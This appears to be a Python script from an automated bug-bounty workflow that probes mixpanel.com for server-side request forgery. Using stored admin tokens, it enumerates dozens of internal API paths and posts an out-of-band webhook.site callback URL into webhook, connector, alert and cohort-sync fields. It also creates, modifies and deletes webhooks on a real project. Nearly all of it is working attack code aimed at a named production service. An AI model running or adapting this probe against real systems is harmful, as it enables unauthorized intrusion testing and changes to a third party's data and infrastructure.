#!/usr/bin/env python3
"""SSRF trigger probe v3 — drill into discovered surfaces:
 - /api/2.0/cohort_sync (sub-actions: list/create/run/test/update/delete)
 - /api/app/projects/{P}/connectors (POST/PATCH to create connector with webhook URL)
 - /api/2.0/cohorts POST (the 500 path) — try shapes that succeed
 - Pull /api/app/projects/{P}/connectors detail (any item) for schema hints
"""
import sys, os, json, time
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

TARGET = 'mixpanel'
tokens = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))
ADMIN = tokens['ADMIN']
PROJECT = 4025923

OAST_UUID = '3028c45a-5f34-4192-bad3-dba270e80b06'
OAST_URL = f'https://webhook.site/{OAST_UUID}'

sh = SafeHttp(allow_raw_for_waf=True)
LOG = f'/home/hunter/new_agent/targets/{TARGET}/notes/session-log.md'
RES = f'/home/hunter/new_agent/results/{TARGET}/ssrf-trigger-{int(time.time())}.json'
results = []

def log(m):
    with open(LOG,'a') as f: f.write(f"[{time.strftime('%H:%M:%S')}] SSRF-TRIGGER: {m}\n")
    print(f"SSRF-TRIGGER: {m}")

def req(method, path, body=None, extra_headers=None, form=False):
    url = f'https://mixpanel.com{path}'
    h = dict(ADMIN['api_request_headers'])
    if extra_headers: h.update(extra_headers)
    if not form:
        h['Content-Type'] = 'application/json'
    try:
        kwargs = {"headers": h, "timeout": 15}
        if body is not None:
            kwargs['data'] = json.dumps(body) if not form else body
        r = sh.request(method, url, **kwargs)
        code = r.status_code
        allow = r.headers.get('Allow', '')
        try:
            j = r.json()
            body_short = json.dumps(j)[:400]
        except:
            body_short = r.text[:400]
        return code, body_short, allow, r
    except Exception as e:
        return -1, str(e)[:200], '', None

def record(tag, method, path, code, body_short, allow=''):
    e = {"tag": tag, "method": method, "path": path, "code": code, "body": body_short,
         "allow": allow, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ")}
    results.append(e)
    flag = ' [*]' if (code not in (-1, 404, 405)) else ''
    log(f"{tag} {method} {path} -> {code} Allow={allow}{flag} | {body_short[:140]}")

# === A: /api/2.0/cohort_sync deep enum ===
log("=== A: /api/2.0/cohort_sync deep ===")
for sub in ['','/list','/create','/new','/save','/run','/sync','/test','/preview','/dispatch','/fire',
            '/trigger','/update','/delete','/destinations','/webhooks','/integrations','/members']:
    path = f'/api/2.0/cohort_sync{sub}?project_id={PROJECT}'
    for m in ['GET','POST','OPTIONS']:
        body = None
        if m == 'POST':
            body = {"project_id": PROJECT, "url": OAST_URL, "name": "tp-cs",
                    "type": "webhook", "actions": ["members"], "destination": OAST_URL,
                    "webhook_url": OAST_URL, "cohort_id": 1}
        code, b, allow, _ = req(m, path, body)
        record(f"A-cohort_sync{sub}-{m}", m, path, code, b[:200], allow)

# === B: /api/app/projects/{P}/connectors deep ===
log("=== B: connectors ===")
for sub in ['','/new','/list','/create','/types','/templates','/webhook','/webhooks','/test',
            '/preview','/run','/sync','/trigger','/dispatch']:
    path = f'/api/app/projects/{PROJECT}/connectors{sub}'
    for m in ['GET','POST','OPTIONS']:
        body = None
        if m == 'POST':
            body = {"name":"tp-conn","url":OAST_URL,"type":"webhook","destination":OAST_URL,
                    "config":{"url":OAST_URL,"webhook_url":OAST_URL},
                    "webhook":{"url":OAST_URL,"name":"tp"}}
        code, b, allow, _ = req(m, path, body)
        record(f"B-connectors{sub}-{m}", m, path, code, b[:200], allow)

# === C: try cohort POST with workspace_id (was the missing param) ===
log("=== C: /api/2.0/cohorts POST shape sweep ===")
shapes = [
    {"project_id": PROJECT, "workspace_id": 0, "name": "tp", "params": "true"},
    {"project_id": PROJECT, "name": "tp", "params": {}},
    {"project_id": PROJECT, "name": "tp", "params": "true"},
    {"project_id": PROJECT, "name": "tp", "groups": [{"event": "$any_event"}]},
    {"project_id": PROJECT, "name": "tp", "behaviors": [{"event": "$any"}]},
]
for s in shapes:
    code, b, allow, _ = req('POST', f'/api/2.0/cohorts', s)
    record("C-cohorts-POST", "POST", f'/api/2.0/cohorts', code, b[:300], allow)

# === D: GraphQL/RPC-style endpoints ===
log("=== D: rpc/graphql/private API ===")
for path in [
    '/api/app/rpc',
    '/api/app/internal',
    '/api/app/v2',
    '/internal/api',
    f'/api/2.0/internal?project_id={PROJECT}',
    f'/api/app/projects/{PROJECT}/rpc',
    f'/api/app/projects/{PROJECT}/private',
    f'/api/app/projects/{PROJECT}/v2',
    f'/api/app/projects/{PROJECT}/v2/webhooks',
]:
    for m in ['GET','POST']:
        body = {"action":"trigger","webhook":OAST_URL} if m=='POST' else None
        code, b, allow, _ = req(m, path, body)
        record(f"D-{m}-{path[-30:]}", m, path, code, b[:200], allow)

# === E: data-pipelines API per official docs ===
log("=== E: data-pipelines docs path ===")
for path in [
    '/api/2.0/pipelines',
    f'/api/2.0/pipelines?project_id={PROJECT}',
    f'/api/2.0/pipelines/list?project_id={PROJECT}',
    f'/api/2.0/pipelines/destinations?project_id={PROJECT}',
    f'/api/2.0/export?from_date=2026-05-01&to_date=2026-05-30&project_id={PROJECT}',
    f'/api/2.0/data_pipelines?project_id={PROJECT}',
    f'/api/2.0/exports?project_id={PROJECT}',
]:
    code, b, allow, _ = req('GET', path)
    record(f"E-{path[-30:]}", "GET", path, code, b[:200], allow)

# === F: alerts (Mixpanel "Alerts" feature per docs/features/alerts) ===
log("=== F: alerts docs path ===")
for path in [
    f'/api/2.0/alerts?project_id={PROJECT}',
    f'/api/2.0/custom_alerts?project_id={PROJECT}',
    f'/api/app/projects/{PROJECT}/custom_alerts/test',
    f'/api/app/projects/{PROJECT}/alert_rules',
    f'/api/app/projects/{PROJECT}/anomaly_alerts',
    f'/api/app/projects/{PROJECT}/insight_alerts',
    f'/api/app/projects/{PROJECT}/board_alerts',
    f'/api/app/projects/{PROJECT}/dashboard_alerts',
    f'/api/app/projects/{PROJECT}/threshold_alerts',
    f'/api/app/projects/{PROJECT}/metric_alerts',
    f'/api/app/projects/{PROJECT}/scheduled_reports',
]:
    for m in ['GET','POST','OPTIONS']:
        body = {"name":"tp","webhook_url":OAST_URL,"webhook":OAST_URL,"url":OAST_URL,
                "notification":{"webhook":OAST_URL,"type":"webhook"}} if m=='POST' else None
        code, b, allow, _ = req(m, path, body)
        record(f"F-{path[-25:]}-{m}", m, path, code, b[:200], allow)

# === G: /api/app/projects/{P}/webhooks PATCH/PUT — does update fire? ===
log("=== G: webhooks UPDATE — does PATCH fire? ===")
code, b, allow, r = req('POST', f'/api/app/projects/{PROJECT}/webhooks',
                        {"name":"tp-patch-fire","url":OAST_URL+"/patch-baseline"})
record("G-create", "POST", f'/api/app/projects/{PROJECT}/webhooks', code, b[:200], allow)
wh_id = None
try:
    wh_id = (json.loads(b).get('results') or {}).get('id')
except: pass

if wh_id:
    # PATCH the URL — does that fire?
    code, b, allow, _ = req('PATCH', f'/api/app/projects/{PROJECT}/webhooks/{wh_id}',
                            {"url": OAST_URL + "/after-patch", "name":"tp-patch-fire"})
    record("G-PATCH", "PATCH", f'/api/app/projects/{PROJECT}/webhooks/{wh_id}', code, b[:200], allow)
    # PUT
    code, b, allow, _ = req('PUT', f'/api/app/projects/{PROJECT}/webhooks/{wh_id}',
                            {"url": OAST_URL + "/after-put", "name":"tp-patch-fire"})
    record("G-PUT", "PUT", f'/api/app/projects/{PROJECT}/webhooks/{wh_id}', code, b[:200], allow)
    # GET (does view fire?)
    code, b, allow, _ = req('GET', f'/api/app/projects/{PROJECT}/webhooks/{wh_id}')
    record("G-GET", "GET", f'/api/app/projects/{PROJECT}/webhooks/{wh_id}', code, b[:200], allow)
    # Cleanup
    code, b, allow, _ = req('DELETE', f'/api/app/projects/{PROJECT}/webhooks/{wh_id}')
    record("G-DELETE", "DELETE", f'/api/app/projects/{PROJECT}/webhooks/{wh_id}', code, b[:200], allow)

# === H: dashboard subscriptions (some platforms email/webhook a dashboard on schedule) ===
log("=== H: dashboard / report subscriptions ===")
for path in [
    f'/api/app/projects/{PROJECT}/subscriptions',
    f'/api/app/projects/{PROJECT}/dashboards/11207838/subscriptions',
    f'/api/app/projects/{PROJECT}/dashboard_subscriptions',
    f'/api/app/projects/{PROJECT}/board_subscriptions',
    f'/api/app/projects/{PROJECT}/reports',
    f'/api/app/projects/{PROJECT}/scheduled_emails',
    f'/api/app/projects/{PROJECT}/scheduled_webhooks',
    f'/api/app/projects/{PROJECT}/webhook_subscriptions',
]:
    code, b, allow, _ = req('GET', path)
    record(f"H-{path[-25:]}-GET", "GET", path, code, b[:200], allow)

with open(RES, 'w') as f: json.dump(results, f, indent=2)
log(f"Saved {RES} entries={len(results)}")
print(f"\nSAVED: {RES}")
